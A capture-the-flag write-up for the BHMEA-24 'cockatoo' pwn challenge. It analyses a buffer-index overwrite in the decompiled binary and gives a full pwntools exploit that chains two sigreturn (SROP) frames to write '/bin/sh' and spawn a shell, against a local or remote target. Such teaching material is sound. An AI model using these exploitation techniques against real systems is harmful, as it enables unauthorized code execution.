## Challenge Description

## Solution

This was the easy pwn challenge in BHMEA-24 quals. In this challenge, we were provided with a binary that had the following mitigations:

```
[*] '/home/theflash2k/Documents/CTFs/BHMEA24/pwn/cucktoo/cockatoo'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
    Debuginfo:  Yes
```

Looking at the disassembly:

```c:disassembly
int __fastcall main(int argc, const char **argv, const char **envp)
{
  __int64 v3; // rax
  __int64 v4; // rax
  char v6[256]; // [rsp+0h] [rbp-110h] BYREF
  __int64 v7; // [rsp+100h] [rbp-10h]
  unsigned __int64 v8; // [rsp+108h] [rbp-8h]

  v8 = __readfsqword(0x28u);
  memset(v6, 0, 0x108uLL);
  while ( read(0LL, &v6[v7], 1LL) == 1 && v6[v7] != 10 )
  {
    v3 = v7++;
    if ( v3 == 256 )
      goto LABEL_6;
  }
  v6[v7 + 1] = 0;
LABEL_6:
  v4 = strlen(v6);
  write(1LL, v6, v4);
  return 0;
}
```

In this function, we have a buffer of `0x100` size called `v6` and after that, there is another variable which will hold the size called `v7`.

Looking at the code: `memset(v6, 0, 0x108uLL);`, what this will do is simply empty the `v6` buffer. But since the size is `0x108`, it will also empty the `v7` and set the size to 0.

Looking at the condition in while loop:

```c
while ( read(0LL, &v6[v7], 1LL) == 1 && v6[v7] != 10 )
```

We can see that, it will simply read 1-byte into the `v6` buffer at index `v7` and the data should not be `10` i.e. `\n`.

The only problem here is that there exists the canary. Let's try and debug this program in GDB to see how it behaves when we give it a larger input.

Looking at the template we have:

```py:exploit.py
#!/usr/bin/env python3

from pwn import *
context.terminal = ["tmux", "splitw", "-h"]

encode = lambda e: e if type(e) == bytes else str(e).encode()
hexleak = lambda l: int(l[:-1] if l[-1] == b'\n' else l, 16)
fixleak = lambda l: unpack((l[:-1] if l[-1] == b'\n' else l).ljust(8, b"\x00"))

exe = "./cockatoo"
elf = context.binary = ELF(exe)
libc = elf.libc
io = remote(sys.argv[1], int(sys.argv[2])
    ) if args.REMOTE else process(argv=[exe], aslr=False)
if args.GDB: gdb.attach(io, """
    b *main+188
""")

payload = flat(
    cyclic(0x100, n=8)
)
io.sendline(payload)

io.interactive()
```

Now, here we can see what's in the RSP:

![alt text](/static/writeups/blackhatmea24-quals/image-2.png)

We overwrote the last byte of the canary:

![alt text](/static/writeups/blackhatmea24-quals/image-3.png)

However, due to this line of code:

```c
v6[v7 + 1] = 0;
```

It will set the last byte of the canary to NULL. Hence returning the canary back to its original state.

## Overwriting RIP and gaining code execution

What we do is simply send `0x17` and it will RIP control.

> Honestly, I do not know why it skipped over the canary, if you know, please let me know. I just debugged it and it just worked ðŸ˜­ðŸ˜­ðŸ˜­

```py
payload = flat(
    cyclic(0x100, n=8),
    b"\x17",
    b"AAAAAAAA"
)
io.sendline(payload)
```

After this, we start looking for gadgets. Some of the gadgets that we find were useful are:

![alt text](/static/writeups/blackhatmea24-quals/image-4.png)

> My command `gadget` missed one useful gadget: `syscall ; ret` (because it using ROPGadget under the hood). So, using `ropper`:

```
0x0000000000401383: syscall;
0x0000000000401a8b: syscall; ret;
```

At this point, I used two SROP payloads.

1. To write `/bin/sh` in the BSS section
2. To call execve.

Since we have the `syscall; ret` gadget, it became really easy.

The first stub would do the following:

```
RAX = 0xF
```

which would invoke the Sigreturn allowing us to write the `/bin/sh` string in the bss. What I did after that is simply store the next ROP chain in the `bss+8`, and in the previous frame, set this address to be equal to RSP. Essentially creating this as the stack and controlling RIP.

So, the final payload becomes:

```py:exploit.py
#!/usr/bin/env python3

from pwn import *
context.terminal = ["tmux", "splitw", "-h"]

encode = lambda e: e if type(e) == bytes else str(e).encode()
hexleak = lambda l: int(l[:-1] if l[-1] == b'\n' else l, 16)
fixleak = lambda l: unpack((l[:-1] if l[-1] == b'\n' else l).ljust(8, b"\x00"))

exe = "./cockatoo"
elf = context.binary = ELF(exe)
libc = elf.libc
io = remote(sys.argv[1], int(sys.argv[2])
    ) if args.REMOTE else process(argv=[exe], aslr=False)
if args.GDB: gdb.attach(io, """
    b *main+188
""")

POP_RAX = 0x0000000000401001
SYSCALL_RET = 0x0000000000401a8b

frame_read = SigreturnFrame()
frame_read.rax = 0x0
frame_read.rdi = 0x0
frame_read.rsi = elf.bss()
frame_read.rdx = 0x100
frame_read.rsp = elf.bss() + 0x8
frame_read.rip = SYSCALL_RET

frame_execve = SigreturnFrame()
frame_execve.rax = 0x3b
frame_execve.rdi = elf.bss()
frame_execve.rsi = 0x0
frame_execve.rdx = 0x0
frame_execve.rip = SYSCALL_RET

payload = flat(
    cyclic(0x100, n=8),
    b"\x17",
    POP_RAX,
    0xf,
    SYSCALL_RET,
    frame_read
)

io.sendline(payload)
time.sleep(0.5)

payload_2 = flat(
    b"/bin/sh\x00",
    POP_RAX,
    0xf,
    SYSCALL_RET,
    frame_execve
)
io.sendline(payload_2)

io.interactive()
```

Overall, the challenge was indeed easy, but I still do not get the actual idea as to how we were able to bypass the canary and directly overwrite the RIP.
